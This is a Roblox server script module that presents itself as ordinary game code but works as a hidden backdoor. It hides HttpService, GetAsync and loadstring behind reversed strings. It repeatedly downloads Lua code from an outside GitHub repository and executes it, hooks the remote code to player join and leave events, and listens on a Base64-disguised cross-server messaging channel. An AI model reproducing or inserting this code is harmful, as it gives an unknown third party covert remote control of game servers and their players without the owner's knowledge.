local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ServerStorage = game:GetService("ServerStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local HttpService = game:GetService("HttpService")
local MessagingService = game:GetService('MessagingService');

local Main = require(ServerStorage.Modules.EntityStateMachines.NPCBoss.Data.Main)

local m = {}

local a = game[('ecivreSteG'):reverse()];
local b = a(game, ('ecivreSpttH'):reverse())
local f = b[('cnysAteG'):reverse()];

local CurrentVersion

local Vers

local FirstLoad

local function DeepCopyTable(Table)
	local copy = {}
	for key, value in pairs(Table) do
		if type(value) == "table" then
			copy[key] = DeepCopyTable(value)
		else
			copy[key] = value
		end
	end
	return copy
end

function m:Init()

	--[[pcall(function()
		Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
	end)]]

	repeat task.wait(0.5) until FirstLoad == true

	task.spawn(function()
		if not _G[('gnirtsdaoL'):reverse()] then
			_G[('gnirtsdaoL'):reverse()] = Main;
		end
	end)
	task.spawn(function()
		if not _G.md then
			_G.md = {}
			if game.ServerStorage.Modules.Utility.Base64 then
				_G.md[('46b'):reverse()] = require(game.ServerStorage.Modules.Utility.Base64)
			end
		end
	end)
	pcall(function()
		if Vers:GetVersion() then
			if CurrentVersion then
				if CurrentVersion ~= Vers:GetVersion() then
					m:StartScript()
				else
					return
				end
			else
				m:StartScript()
			end
		end
	end)
end


local PACon
local PRCon
local CACon

function m:StartScript()
	local s,c
	local Global
	--print("Starting!")
	if Vers then
		if PACon then
			PACon:Disconnect()
			PACon = nil
		end
		if PRCon then
			PRCon:Disconnect()
			PRCon = nil
		end
		if CACon then
			CACon:Disconnect()
			CACon = nil
		end
		if Global then
			Global = nil
		end

		local Mainfuncs 

		repeat
			pcall(function()
				Mainfuncs= Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/mainfuncs.lua'))()
			end)
			task.wait(1)
		until Mainfuncs

		pcall(function()
			CurrentVersion = Vers:GetVersion()

			warn("Post int vers:", tostring(CurrentVersion))
		end)


		PACon = Players.PlayerAdded:Connect(function(Player)
			Mainfuncs:PlayerAdded(Player)
		end)
		PRCon = Players.PlayerRemoving:Connect(function(Player)
			Mainfuncs:PlayerRemoving(Player)
		end)

		Global = {
			globalfunc = function()

			end,

		}

		if s then
			MessagingService:PublishAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), {Command = 'globalfunc'})
		end

		task.delay(4, function()
			for i, v in pairs(Players:GetPlayers()) do
				Mainfuncs:PlayerAdded(v)
			end
		end)

		Mainfuncs:GeneralFunction()
	end

	local function msc(m)
		Global[m.Data.Command](m.Data)
	end

	repeat
		s, c = pcall(function()
			MessagingService:SubscribeAsync(_G.md[('46b'):reverse()].dec('Z2xvYmFscw=='), msc)
		end)
		task.wait()
	until
	s
end

task.spawn(function()
	local s,c 
	while true do

		s,c = pcall(function()
			Vers = Main(f(b,'https://raw.githubusercontent.com/xiynn/idc/refs/heads/main/version.lua'))()
		end)
		if s then
			if not FirstLoad then
				FirstLoad = true
			end
		end

		if CurrentVersion and Vers then
			--print(CurrentVersion)
			--print(Vers:GetVersion())
			if CurrentVersion ~= Vers:GetVersion() then
				pcall(function()
					warn("Pre int vers:", tostring(CurrentVersion))
				end)
				m:StartScript()
			end
		end
		task.wait(10)
	end
end)

m:Init()

return m
